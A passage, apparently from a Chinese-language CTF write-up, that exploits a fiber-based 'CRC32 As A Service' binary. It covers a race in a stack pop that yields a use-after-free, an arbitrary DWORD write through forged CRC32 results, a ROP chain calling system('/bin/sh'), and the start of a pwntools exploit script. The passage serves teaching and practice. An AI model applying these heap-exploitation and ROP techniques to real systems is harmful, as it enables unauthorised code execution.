+</span>    <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">stack</span> <span class="o">==</span> <span class="n">old_head</span><span class="p">)</span> <span class="p">{</span>
+      <span class="o">*</span><span class="n">stack</span> <span class="o">=</span> <span class="n">new_head</span><span class="p">;</span><span class="c1">//if exploit properly, *stack can be setted to a dangling pointer
+</span>      <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+
+  <span class="kt">void</span> <span class="o">*</span><span class="n">result</span> <span class="o">=</span> <span class="n">old_head</span><span class="o">-&gt;</span><span class="n">entry</span><span class="p">;</span>
+  <span class="n">free</span><span class="p">(</span><span class="n">old_head</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// App
+</span>
+<span class="k">struct</span> <span class="n">job</span> <span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">job_id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">n_jobs</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">n_workers</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">n_results</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">worker</span><span class="p">()</span> <span class="p">{</span>
+  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[Worker #%08x] Getting Job</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span><span class="p">)</span><span class="n">g_fib</span><span class="p">);</span>
+    <span class="k">struct</span> <span class="n">job</span><span class="o">*</span> <span class="n">job</span> <span class="o">=</span> <span class="n">pop</span><span class="p">(</span><span class="o">&amp;</span><span class="n">job_stack</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">job</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"[Worker #%08x] Empty queue, sleeping</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span><span class="p">)</span><span class="n">g_fib</span><span class="p">);</span>
+      <span class="n">fiber_yield</span><span class="p">();</span>
+      <span class="k">continue</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[Worker #%08x] Got a job</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span><span class="p">)</span><span class="n">g_fib</span><span class="p">);</span>
+
+    <span class="o">*</span><span class="p">(</span><span class="n">job</span><span class="o">-&gt;</span><span class="n">result</span><span class="p">)</span> <span class="o">=</span> <span class="n">crc32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">job</span><span class="o">-&gt;</span><span class="n">input</span><span class="p">,</span> <span class="n">job</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">);</span>
+    <span class="n">n_jobs</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">n_results</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">push</span><span class="p">(</span><span class="o">&amp;</span><span class="n">result_stack</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">job</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">menu</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Menu: (stats: %d workers, %d jobs, %d results)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">n_workers</span><span class="p">,</span> <span class="n">n_jobs</span><span class="p">,</span> <span class="n">n_results</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"  1. Request CRC32 computation</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"  2. Add a worker</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"  3. Yield to workers</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"  4. Toggle worker</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"  5. Gather some results</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"  6. Exit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="n">choice</span><span class="p">;</span>
+  <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">choice</span><span class="p">);</span>
+  <span class="n">fgetc</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span> <span class="c1">// consume new line
+</span>  <span class="k">return</span> <span class="n">choice</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">wid</span><span class="p">,</span> <span class="n">size</span><span class="p">;</span>
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">fiber_init</span><span class="p">();</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"=================================</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"===     CRC32 As A Service     ==</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"=================================</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+
+  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">switch</span><span class="p">(</span><span class="n">menu</span><span class="p">())</span> <span class="p">{</span>
+      <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">n_jobs</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">printf</span><span class="p">(</span><span class="s">"Size: "</span><span class="p">);</span>
+          <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
+          <span class="n">fgetc</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span> <span class="c1">// consume new line
+</span>          <span class="k">if</span><span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x100</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"Error: input needs to be smaller than 0x100"</span><span class="p">);</span>
+          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">input</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"Contents:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+            <span class="n">assert</span><span class="p">(</span><span class="n">size</span> <span class="o">==</span> <span class="n">fread</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">stdin</span><span class="p">));</span>
+
+            <span class="k">struct</span> <span class="n">job</span> <span class="o">*</span><span class="n">job</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">job</span><span class="p">));</span>
+            <span class="n">job</span><span class="o">-&gt;</span><span class="n">id</span> <span class="o">=</span> <span class="n">job_id</span><span class="p">;</span>
+            <span class="n">job</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+            <span class="n">job</span><span class="o">-&gt;</span><span class="n">input</span> <span class="o">=</span> <span class="n">input</span><span class="p">;</span>
+            <span class="n">job</span><span class="o">-&gt;</span><span class="n">result</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">));</span>
+
+            <span class="n">push</span><span class="p">(</span><span class="o">&amp;</span><span class="n">job_stack</span><span class="p">,</span> <span class="n">job</span><span class="p">);</span>
+            <span class="n">n_jobs</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+
+            <span class="n">printf</span><span class="p">(</span><span class="s">"Requested job. ID: #%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">job_id</span><span class="o">++</span><span class="p">);</span>
+          <span class="p">}</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+          <span class="n">printf</span><span class="p">(</span><span class="s">"Error: job worker limit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">n_workers</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">n_workers</span><span class="o">++</span><span class="p">;</span>
+          <span class="n">fiber_new</span><span class="p">(</span><span class="n">worker</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+          <span class="n">printf</span><span class="p">(</span><span class="s">"Error: reached worker limit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Working...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">fiber_yield</span><span class="p">();</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Finished working for now.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">4</span><span class="p">:</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Worker ID: #"</span><span class="p">);</span>
+        <span class="n">scanf</span><span class="p">(</span><span class="s">"%x"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">wid</span><span class="p">);</span>
+        <span class="n">fgetc</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span> <span class="c1">// consume new line
+</span>        <span class="k">if</span><span class="p">(</span><span class="n">fiber_pause</span><span class="p">((</span><span class="n">ucontext_t</span> <span class="o">*</span><span class="p">)</span><span class="n">wid</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">printf</span><span class="p">(</span><span class="s">"Pausing worker #%08x.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">wid</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">fiber_resume</span><span class="p">((</span><span class="n">ucontext_t</span> <span class="o">*</span><span class="p">)</span><span class="n">wid</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">printf</span><span class="p">(</span><span class="s">"Resuming worker #%08x.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">wid</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+          <span class="n">printf</span><span class="p">(</span><span class="s">"Error: Worker #%08x not found.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">wid</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">5</span><span class="p">:</span>
+        <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+          <span class="k">struct</span> <span class="n">job</span> <span class="o">*</span><span class="n">job</span> <span class="o">=</span> <span class="n">pop</span><span class="p">(</span><span class="o">&amp;</span><span class="n">result_stack</span><span class="p">);</span>
+          <span class="k">if</span><span class="p">(</span><span class="n">job</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"No more results right now. Try again later.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+            <span class="n">n_results</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"Job #%08x result: %08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">job</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">,</span> <span class="o">*</span><span class="n">job</span><span class="o">-&gt;</span><span class="n">result</span><span class="p">);</span>
+            <span class="n">free</span><span class="p">(</span><span class="n">job</span><span class="o">-&gt;</span><span class="n">result</span><span class="p">);</span>
+            <span class="n">free</span><span class="p">(</span><span class="n">job</span><span class="p">);</span>
+          <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="nl">default:</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>题目提供了一个crc32计算服务，我们可以请求crc32计算，添加协程，切换到协程，暂停协程，收集计算结果并显示。这个服务使用的是非抢占式的协程切换，需要yield主动切换到其他协程。如果对线程切换原理有过了解，看这个代码应该不难。。如果没有，呃，好好学习大学的操作系统课程再来打CTF。。。！（逃</p>
+
+<h2 id="0x03-uaf">0x03 利用漏洞点构造UAF</h2>
+
+<p>这个漏洞点可真是难找，我当时对着代码看了好久都没发现任何显而易见问题（溢出或者格式化字符串漏洞或者UAF Double Free什么的）。找了好久，终于发现，本应该是临界区的pop操作，被分开了！</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span><span class="o">*</span> <span class="nf">pop</span><span class="p">(</span><span class="k">struct</span> <span class="n">node</span> <span class="o">**</span><span class="n">stack</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">struct</span> <span class="n">node</span> <span class="o">*</span><span class="n">old_head</span><span class="p">,</span> <span class="o">*</span><span class="n">new_head</span><span class="p">;</span>
+  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">old_head</span> <span class="o">=</span> <span class="o">*</span><span class="n">stack</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">old_head</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
+      <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span><span class="c1">//empty stack case
+</span>    <span class="p">}</span>
+    <span class="n">new_head</span> <span class="o">=</span> <span class="n">old_head</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+    <span class="n">fiber_yield</span><span class="p">();</span><span class="c1">//exploit here
+</span>    <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">stack</span> <span class="o">==</span> <span class="n">old_head</span><span class="p">)</span> <span class="p">{</span>
+      <span class="o">*</span><span class="n">stack</span> <span class="o">=</span> <span class="n">new_head</span><span class="p">;</span><span class="c1">//if exploit properly, *stack can be setted to a dangling pointer
+</span>      <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+</code></pre></div>
+<p>注释是我自己加的，意思是，这个yield可以被利用，如果操作得当，*stack可以被设置为一个dangling pointer。</p>
+
+<p>但是又有一个问题，他每次切换回来的时候，都会检查*stack和old_head是否相等，如果不等，那么会重新加载一次new_head和old_head并且再次yield。这给利用造成了一些困难。不过，我们可以想想堆运行原理：被free后的内存会被insert到fastbin中，再malloc的话会直接从fastbin里面取，这样会导致内存地址是一样的。如果对堆的运行机制不了解，可以看看这篇文章<a href="https://jaq.alibaba.com/community/art/show?articleid=315">https://jaq.alibaba.com/community/art/show?articleid=315</a>。</p>
+
+<p>这样我们就有利用的思路了。</p>
+
+<ol>
+<li>添加两个worker协程</li>
+<li>创建两个job，大小为128，最开始我用128是为了防止因为创建的用于装内容的堆被塞入fastbin，不过后面看了一下，这个内存不会被free掉。。。所以不影响，但是后面这个job是可能要拿来装payload的，所以尽量大点也无所谓吧。先添加worker再添加job也是有道理的，因为第一，我们的payload可能要有堆基址的信息，而worker可以直接泄露堆基址，所以先拿到堆基址总没坏处；第二，到时候ROP可能会调用scanf这种函数，需要很大栈空间，所以在后面malloc可以使得他在堆区域的比较后面的位置，这样栈的空间就足够了。</li>
+<li>这个时候yield，我们发现两个worker不会立刻开始计算，而是会卡在pop的yield，然后切回主协程，如图。此时，new_head和old_head，分别是第1个job和第2个job。
+<img src="/images/742286_X4WYPPN6B8XBVAG.png" alt=""></li>
+<li>此时暂停第二个worker，所以待会yield他就不会运行了</li>
+<li>yield两次，用第一个worker计算出crc32，此时job_stack为空(NULL)</li>
+<li>收集crc32的运行结果，这时会释放result和node到大小为0x10的fastbin中（注意虽然result分配的大小是4，但是会向上取8的倍数，加上堆块的头，就是16bytes）。如图，此时0x10的fastbin中有4个chunk，其中从左到右第一个和第三个是之前result的内存空间，而第二个和第四个是node的内存空间。因为收集result时，是先pop，其中调用了free，再free的result。从左到右前两个是第2个job所malloc过的内存，后两个是第1个job所malloc过的内存。。
+<img src="/images/742286_YN4474EZ5XWZVK8.png" alt=""></li>
+<li>这个时候再创建一个大小为128的job，注意这个大小不能太小，不然会从fastbin里面拿。此时是先malloc的result，然后push里面再malloc的node。所以，存入job_stack的，刚好是第2个job的node，同时，这个值也会等于正在暂停的第二个worker的old_head！这样，如果我们再运行第二个worker，*stack == old_head会被通过！并且，job_stack的值会被设置为之前所存放的的new_head，这是第1个job的node，而这个地址此时还在fastbin中！这样我们就构造了一个UAF！</li>
+<li>恢复worker 2</li>
+<li>yield，构造出如上所说的UAF，如图所示
+<img src="/images/742286_5GST5YTHQRW8QBS.png" alt="">
+## 0x04 利用UAF</li>
+</ol>
+
+<p>接下来就是想，该怎么利用这个UAF了。</p>
+
+<p>与劫持C++虚表的UAF利用的套路不同，这个不是C++程序，所以利用只有另求方法。</p>
+
+<p>这个时候job_stack的值在fastbin中，但是我们对node没有直接写入的权限，不能像一些套路一样，改写fd的值，使malloc返回自定义的地址。如果我们再分配一个128字节的job，新的job node和旧的job node会指向同一个地址。所以栈这个单向链表会形成一个环，想了一想，发现不好利用。</p>
+
+<p>那么，既然job数据的大小是可控的，那么我们为什么不能让这个分配到一个0x10的fastbin呢？我们来看看malloc的顺序：</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">input</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"Contents:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">assert</span><span class="p">(</span><span class="n">size</span> <span class="o">==</span> <span class="n">fread</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">stdin</span><span class="p">));</span>
+
+<span class="k">struct</span> <span class="n">job</span> <span class="o">*</span><span class="n">job</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">job</span><span class="p">));</span>
+<span class="n">job</span><span class="o">-&gt;</span><span class="n">id</span> <span class="o">=</span> <span class="n">job_id</span><span class="p">;</span>
+<span class="n">job</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+<span class="n">job</span><span class="o">-&gt;</span><span class="n">input</span> <span class="o">=</span> <span class="n">input</span><span class="p">;</span>
+<span class="n">job</span><span class="o">-&gt;</span><span class="n">result</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">));</span>
+
+<span class="n">push</span><span class="p">(</span><span class="o">&amp;</span><span class="n">job_stack</span><span class="p">,</span> <span class="n">job</span><span class="p">);</span>
+</code></pre></div>
+<p>可见，是先malloc输入的缓冲区，再malloc存结果的缓冲区，最后push里面再malloc node的缓冲区。</p>
+
+<p>此时，0x10的fastbin中有两个chunk，如果size &lt; 8的话，input会拿第一个，而result就拿第二个。而result，是存放计算crc32结果的地方，同时也是*job_stack此时的值！既然是存放我们输入数据的crc32计算结果的地方，我们相当于可以控制他的值！那么，如果我们构造一个4字节的payload，使得crc32的计算结果是我们某个可控的chunk的地址（比方说，第一个job内容的地址），便可以伪造一个job struct，其中result指向某个地址，input指向crc32是这个地址的payload。这个时候再算这个job，便可以实现任意地址DWORD SHOOT！</p>
+
+<p>如图所示：<br>
+ <img src="/images/742286_MP57FSG3UZYQR4V.png" alt=""></p>
+
+<p>具体步骤为：（接上面的）</p>
+
+<ol>
+<li>暂停第二个worker，免得他干扰我们</li>
+<li>创造一个大小为4的job，其中内容的crc32是我们第一个job的128字节的input的地址，所以在我们创造第一个job的时候，内容必须要就要被构造好</li>
+<li>yield两次，让第一个worker计算我们的内容。之所以是两次，是因为此时第一个worker是卡在pop的，出来的话会发现*job_stack的值和所存的old_head不一样，所以会重新加载一次，这个时候再yield，就可以让job_stack指向我们第一个job所分配的128字节的chunk</li>
+</ol>
+
+<h2 id="0x05-dword-shoot">0x05 确定DWORD SHOOT目标以及内容</h2>
+
+<p>现在，我们有枪了，但是还没有确定我们要射的目标。DWORD SHOOT，射在哪里，射什么，是一门艺术。当时我想到了几个方案：</p>
+
+<ol>
+<li>shoot g_fib为我们的chunk，比方说job2的申请的128字节，这样就能完全控制ucontext_t。切换协程时，可以让这个协程完全被我们所控制。但是ucontext_t的大小是大于128字节的，所以有些字段我们会控制不到，所以在协程切换时可能会有意想不到的错误，所以，pass</li>
+<li>shoot 主协程的eip，好吧，只射eip完全没什么用，因为堆不可执行，没法直接shellcode</li>
+<li>shoot 主协程的esp，但是，swapcpntext返回后，如图，会直接leave，即mov esp,ebp; pop ebp
+<img src="/images/742286_8MQDVJCRHCWU5FK.png" alt=""></li>
+<li>所以，不如直接射ebp，把他射到我们的第二个job的128字节的input上，可实现ROP</li>
+</ol>
+
+<h2 id="0x06-rop">0x06 ROP构造</h2>
+
+<p>本来想通过一些gadget实现获取got表free地址并计算出system地址然后call的，然而这题ALU相关的gadget真是少的可怜。。。好吧，你算不出来，我帮你算。即，先调用puts (printf占用的栈空间实在太大，要0x2000多。。。实在是坑。。。)，然后脚本来算出system地址，scanf把他存到ROP的后面的某个位置上。(本来我是通过fread的，其中FILE*直接给的就是__bss_start的地址，然而这样不行。。因为fread所需要的是__bss_start里面的内容，不是他的地址。。。)</p>
+
+<p>下面就是ROP的具体内容</p>
+
+<p>+0x00:<br>
+  +0x10 ebp<br>
+  0x8048520 puts addr<br>
+  0x8048618 leave/ret addr<br>
+  0x804A5E8 got addr of free<br>
++0x10:<br>
+  +0x24 ebp<br>
+  0x8048590 scanf addr<br>
+  0x8048618 leave/ret addr<br>
+  &quot;%x&quot; addr<br>
+  +0x28 ; address to be modified to system address<br>
++0x24:<br>
+  0 ;ebp<br>
++0x28:<br>
+  0 ;to be modified to address of system<br>
+  0<br>
+  +0x34 &quot;/bin/sh&quot; addr<br>
++0x34:<br>
+  &quot;/bin/sh&quot;<br>
++0x3c:<br>
+  &quot;%x\x00\x00&quot;<br>
++0x40:</p>
+
+<p>很明显，执行到leave的时候，会把esp设为+0x00处地址，然后pop ebp，可以接着继续控制ROP。这是一个ROP技巧，只要能通过这种方式控制ebp，就可以一直通过将返回地址设为leave/ret，实现几个函数的连续调用（注意，根据调用约定，任何libc的函数都不会改变ebp的值）。</p>
+
+<p>所以最后一步：（接着上面的）</p>
+
+<ol>
+<li>yield，这个时候会用我们的fake job struct中的数据计算crc32，写到主协程的ebp中。然后yield切换回主协程时，ebp已经被篡改，进入我们的ROP</li>
+</ol>
+
+<h2 id="0x07-exp">0x07 exp编写</h2>
+
+<p>还有一点，堆分配出来的地址，在一定情况下，是确定的。即，只要确定堆基址，然后堆分配操作顺序一定，出来的相对堆基址的偏移必然一样。</p>
+
+<p>不过我在调试的时候，出现了问题：就是当我直接命令行运行程序或者用gdb调试，与用pwntools运行程序，堆分配的偏移会不一样。但是在服务器上，是一样的。不知道是什么原因，如果有大神知道，可以一起讨论。</p>
+
+<p>好了，接着，我们用gdb调试，获取到主协程ucontext_t，第一个job和第二个job输入的地址，然后记录下worker1和worker2的地址，然后readelf找到system和free的偏移，就可以上手写exp了。</p>
+
+<p>顺便说一下，这个题目是给一个shell，但是权限不够cat flag，所以要通过get这个程序的shell拿到flag。因为这个原因，我们可以用这个shell，下载并开启gdb peda，获取到以上的信息，写入exp</p>
+
+<p>exp如下：</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">g_local</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="k">if</span> <span class="n">g_local</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">"./caas"</span><span class="p">)</span>
+    <span class="n">WORKER1_ADDR</span> <span class="o">=</span> <span class="mh">0x1170</span><span class="c">#0x570</span>
+    <span class="n">WORKER2_ADDR</span> <span class="o">=</span> <span class="mi">37592</span><span class="c">#0x86d8</span>
+    <span class="n">WORKER1_SIGN</span> <span class="o">=</span> <span class="mh">0x170</span><span class="c">#0x570</span>
+    <span class="n">JOB1_CONTENT_ADDR</span> <span class="o">=</span> <span class="mh">0x11440</span><span class="c">#0x10840</span>
+    <span class="n">JOB2_CONTENT_ADDR</span> <span class="o">=</span> <span class="mh">0x11500</span><span class="c">#0x10900</span>
+    <span class="n">SYSTEM_ADDR</span> <span class="o">=</span> <span class="mh">0x0003ada0</span><span class="c">#0x3ada0</span>
+    <span class="n">FREE_ADDR</span> <span class="o">=</span> <span class="mh">0x71470</span><span class="c">#0x71470</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">"/problems/4e35adf4276b6c2f727f265de95d588b/caas"</span><span class="p">)</span>
+    <span class="n">WORKER1_ADDR</span> <span class="o">=</span> <span class="mh">0x168</span>
+    <span class="n">WORKER2_ADDR</span> <span class="o">=</span> <span class="mh">0x82d0</span>
+    <span class="n">WORKER1_SIGN</span> <span class="o">=</span> <span class="n">WORKER1_ADDR</span>
+    <span class="n">JOB1_CONTENT_ADDR</span> <span class="o">=</span> <span class="mh">0x10438</span>
+    <span class="n">JOB2_CONTENT_ADDR</span> <span class="o">=</span> <span class="mh">0x104f8</span>
+    <span class="n">SYSTEM_ADDR</span> <span class="o">=</span> <span class="mh">0x3e3e0</span>
+    <span class="n">FREE_ADDR</span> <span class="o">=</span> <span class="mh">0x76110</span>
+
+<span class="n">heap_base_addr</span> <span class="o">=</span> <span class="bp">None</span>
+
+<span class="n">MAIN_EBP_ADDR</span> <span class="o">=</span> <span class="mh">0x034</span>
+
+
+<span class="n">CHUNK_SIZE</span> <span class="o">=</span> <span class="mi">128</span>
+
+<span class="n">crc32_to_bytes</span> <span class="o">=</span> <span class="p">{}</span>
+
+<span class="k">def</span> <span class="nf">crack_crc32</span><span class="p">(</span><span class="n">crc32val</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">crc32_to_bytes</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">crc32val</span> <span class="ow">in</span> <span class="n">crc32_to_bytes</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">crc32_to_bytes</span><span class="p">[</span><span class="n">crc32val</span><span class="p">]</span>
+    <span class="n">cracksh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./crack_crc32"</span><span class="p">)</span>
+    <span class="n">cracksh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">crc32val</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">cracksh</span><span class="o">.</span><span class="n">recv</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))</span>
